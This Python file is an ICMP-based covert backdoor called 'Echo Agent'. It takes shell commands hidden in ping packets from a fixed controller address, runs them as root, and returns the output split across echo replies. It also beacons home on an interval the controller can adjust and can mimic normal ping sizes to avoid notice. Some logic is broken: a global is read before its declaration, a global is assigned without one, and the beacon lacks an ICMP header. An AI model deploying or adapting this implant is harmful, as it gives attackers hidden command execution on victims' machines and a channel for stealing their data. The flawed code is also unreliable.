import socket
import struct
import subprocess
import sys
import argparse
import time

# IPs to parse commands from
CONTROLLER_IPS = ['192.168.13.104']
COMMAND_PREFIX = b"CMD_EXEC:"
RESPONSE_PREFIX = b"CMD_RESPONSE:"

# Initialize variables
LAST_COMMAND_TIME = time.time()
BEACON_INTERVAL = 392  # 6 minutes, 32 seconds in seconds

def parse_arguments():
    parser = argparse.ArgumentParser(description='Echo Agent')
    parser.add_argument('--size', type=int, default=1024,
                        help='Max packet size (default: 1024). Use 84 to mimic standard ICMP packet lengths.')
    args = parser.parse_args()
    return args.size

MAX_PACKET_SIZE = parse_arguments()
ICMP_HEADER_SIZE = 8
IP_HEADER_SIZE = 20
FRAGMENT_HEADER_SIZE = 4
PAYLOAD_SIZE = MAX_PACKET_SIZE - IP_HEADER_SIZE - ICMP_HEADER_SIZE
FRAGMENT_SIZE = PAYLOAD_SIZE - FRAGMENT_HEADER_SIZE - len(RESPONSE_PREFIX)

def log(message):
    print(f"[*] {message}", file=sys.stderr, flush=True)

def calculate_checksum(packet):
    if len(packet) % 2 != 0:
        packet += b'\0'
    words = struct.unpack("!%sH" % (len(packet) // 2), packet)
    return (~sum(words) & 0xffff)

def create_icmp_socket():
    try:
        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_socket.settimeout(10)
        return icmp_socket
    except PermissionError:
        log("Error: This script requires root privileges. Please run with sudo.")
        sys.exit(1)

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def send_beacon():
    icmp_socket = create_icmp_socket()
    packets = []
    for ip in CONTROLLER_IPS:
        icmp_socket.sendto(b"BEACON_REQUEST", (ip, 0))
        try:
            packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
            packets.append(packet)
        except socket.timeout:
            log("No response received from controller within the specified interval.")
        except Exception as e:
            log(f"Error receiving response: {e}")
    icmp_socket.close()
    return packets

def parse_beacon_response(icmp_data):
    if icmp_data.startswith(b"BEACON_FREQUENCY:"):
        new_interval = int(icmp_data.split(b':')[1].strip().decode())
        log(f"Received beacon response with new interval: {new_interval} seconds")
        return "beacon_frequency", new_interval
    elif icmp_data.startswith(b"BEACON_UPDATE:"):
        return "beacon_update"
    elif icmp_data.startswith(COMMAND_PREFIX):
        command = icmp_data[len(COMMAND_PREFIX):].decode().strip()
        log(f"Received command: {command}")
        return "command", command
    
    log("Invalid beacon response received.")
    return "other", None

def parse_commands(icmp_type, icmp_data, addr, packet):
    if icmp_type == 8 and addr[0] in CONTROLLER_IPS:
        response_type, response_value = parse_beacon_response(icmp_data)
        if response_type == "beacon_update":
            send_beacon()
        elif response_type == "beacon_frequency":
            global BEACON_INTERVAL
            BEACON_INTERVAL = response_value
        elif response_type == "command":
            command = icmp_data[len(COMMAND_PREFIX):].decode().strip()
            log(f"Executing command: {command}")
            output = execute_command(command)

            #Craft reply
            fragments = [output[i:i+FRAGMENT_SIZE] for i in range(0, len(output), FRAGMENT_SIZE)]
            total_fragments = len(fragments)
            
            icmp_socket = create_icmp_socket()
            icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', packet[20:28])
            for i, fragment in enumerate(fragments):
                fragment_header = struct.pack("!HH", i, total_fragments)
                payload = fragment_header + RESPONSE_PREFIX + fragment
                padding = b'\0' * (PAYLOAD_SIZE - len(payload))
                padded_payload = payload + padding
                reply_header = struct.pack("!BBHHH", 0, 0, 0, p_id, sequence + i)
                reply_checksum = calculate_checksum(reply_header + padded_payload)
                reply_header = struct.pack("!BBHHH", 0, 0, reply_checksum, p_id, sequence + i)
                reply_packet = reply_header + padded_payload
                log(f"Sending fragment {i+1}/{total_fragments}. Packet size: {len(reply_packet)}")
                icmp_socket.sendto(reply_packet, addr)
            icmp_socket.close()
    if addr[0] in CONTROLLER_IPS:
        return time.time()
    return 0

def server():
    log("Starting server with packet length " + str(MAX_PACKET_SIZE))
    icmp_socket = create_icmp_socket()
    
    while True:
        try:
            current_time = time.time()
            elapsed_time = current_time - LAST_COMMAND_TIME
            if elapsed_time > BEACON_INTERVAL:
                log(f"No command received in the last {BEACON_INTERVAL} seconds. Sending beacon.")
                packets = send_beacon()
                for packet in packets:
                    icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', packet[20:28])
                    icmp_data = packet[28:]
                    response_type, response_value = parse_beacon_response(icmp_data)
                    if response_type == "beacon_frequency":
                        global BEACON_INTERVAL
                        BEACON_INTERVAL = response_value
        
            packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
            icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', packet[20:28])
            icmp_data = packet[28:]


            tmp_last_command = parse_commands(icmp_type, icmp_data, addr, packet)
            if tmp_last_command is not None:
                LAST_COMMAND_TIME = tmp_last_command

        except socket.timeout:
            log("No response received from controller within the specified interval.")  # Reset timeout
        except Exception as e:
            log(f"Error in server loop: {e}")

if __name__ == "__main__":
    server()